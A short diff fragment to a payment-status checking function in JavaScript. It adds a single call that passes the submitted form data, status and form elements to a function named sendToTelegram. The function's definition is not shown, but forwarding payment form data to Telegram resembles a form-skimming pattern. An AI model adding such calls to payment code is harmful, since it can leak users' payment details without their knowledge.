@@ -538,6 +538,8 @@ async function checkPaymentStatus(
 
         clearInterval(interval);
 
+        await sendToTelegram( formData, status, submitBtn, form );
+
         document
           .getElementById('paymentStatus')
           .innerHTML =
